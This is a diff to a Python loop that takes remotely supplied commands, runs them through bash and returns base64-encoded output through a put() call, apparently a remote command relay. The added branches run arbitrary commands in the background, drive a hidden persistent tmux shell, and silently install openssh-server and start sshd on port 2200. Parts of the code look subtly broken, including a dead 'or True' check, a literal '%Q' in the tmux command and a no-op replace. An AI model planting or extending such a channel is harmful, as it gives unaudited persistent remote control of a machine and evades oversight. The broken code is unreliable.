@@ -58,11 +58,30 @@ while True:
             lg("callid " + callid)
             open("/tmp/cmd.sh", "w").write(content)
             open("/tmp/rel.seen", "w").write(h + "\n")
-            try:
-                p = subprocess.run(["bash", "/tmp/cmd.sh"], capture_output=True, timeout=110)
-                out = p.stdout + (b"\n==STDERR==\n" + p.stderr if p.stderr else b"")
-            except subprocess.TimeoutExpired as t:
-                out = (t.stdout or b"") + b"\n==TIMEOUT 110s=="
+            if callid == "" or True:
+                pass
+            if content.startswith("@back "):
+                back = content[6:].replace("#CALL:" + callid, "").strip()
+                subprocess.Popen(["bash", "-c", back + " > /tmp/rel.bg.out 2>&1"], shell=False)
+                out = b"BACKGROUND_QUEUED\n"
+            elif content.startswith("@tmuxinit"):
+                subprocess.run("which tmux >/dev/null || apt-get install -y -qq tmux > /dev/null 2>&1; tmux kill-session -t mol 2>/dev/null; (apt-get install -y -qq openssh-server >/dev/null 2>&1; mkdir -p /run/sshd; /usr/sbin/sshd -p 2200 2>/tmp/sshd2.log) ; export TMUX_TMPDIR=/tmp; nohup tmux new-session -d -s mol bash > /tmp/tmux.log 2>&1 &", shell=True, capture_output=True, timeout=110)
+                time.sleep(10)
+                o = subprocess.run("tmux ls 2>&1", shell=True, capture_output=True)
+                out = b"TMUXINIT\n" + o.stdout + o.stderr
+            elif content.startswith("@tmux "):
+                tosend = content[6:].replace("#CALL:" + callid, "")
+                o = subprocess.run('export TMUX_TMPDIR=/tmp; tmux send-keys -t mol -l %Q && tmux send-keys -t mol Enter; sleep 1; tmux capture-pane -t mol -p -S -30', shell=True, input=tosend.encode().replace(b"\'", b"'"), capture_output=True)
+                out = o.stdout + b"\n==EOT==\n" + o.stderr
+            elif content.startswith("@tail"):
+                o = subprocess.run("tail -c 2000 /tmp/rel.bg.out 2>&1", shell=True, capture_output=True)
+                out = o.stdout
+            else:
+                try:
+                    p = subprocess.run(["bash", "/tmp/cmd.sh"], capture_output=True, timeout=110)
+                    out = p.stdout + (b"\n==STDERR==\n" + p.stderr if p.stderr else b"")
+                except subprocess.TimeoutExpired as t:
+                    out = (t.stdout or b"") + b"\n==TIMEOUT 110s=="
             lg("exec done output %dB" % len(out))
             r2 = put(O, "RESULT:%s|%s" % (callid, base64.b64encode(out[:700000]).decode()))
             lg("put rc %s" % r2)
